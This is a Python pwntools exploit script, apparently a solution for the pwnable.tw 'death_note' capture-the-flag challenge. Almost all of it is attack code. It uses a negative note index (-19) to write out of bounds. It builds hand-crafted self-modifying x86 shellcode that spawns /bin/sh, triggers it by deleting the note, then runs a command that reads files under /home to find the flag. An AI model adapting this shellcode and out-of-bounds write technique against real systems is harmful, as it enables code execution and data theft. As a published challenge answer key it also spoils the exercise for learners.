#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./death_note"

if sys.argv[1] == "l":
    io = process("./death_note")

else:
    io = remote("chall.pwnable.tw", 10201)

def addName(idx, name):
    io.sendlineafter("choice :", "1")
    io.sendlineafter("Index :", str(idx))
    io.sendlineafter("Name :", name)

def showName(idx):
    io.sendlineafter("choice :", "2")
    io.sendlineafter("Index :", str(idx))

def delName(idx):
    io.sendlineafter("choice :", "3")
    io.sendlineafter("Index :", str(idx))

if __name__ == "__main__":
    offset = 0x27
    sc = asm(shellcraft.sh())
    sc = asm('''
            push   0x68
            push   0x732f2f2f
            push   0x6e69622f
            push esp
            pop ebx

            dec edx
            dec edx

            xor [eax + {}], dl
            xor [eax + {}], dl

            inc edx
            inc edx

            push edx
            pop ecx

            push edx
            pop eax

            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            inc eax
            '''.format(offset, offset + 1))
    sc += '\x33\x7e'
    print disasm(sc)
    assert len(sc) <= 0x50

    context.log_level = "debug"
    #  gdb.attach(io, "b *0x8048873\nc")
    addName(-19, sc)
    delName(-19)

    io.sendline("cat /home/*/*| strings| grep -i flag")

    io.interactive()
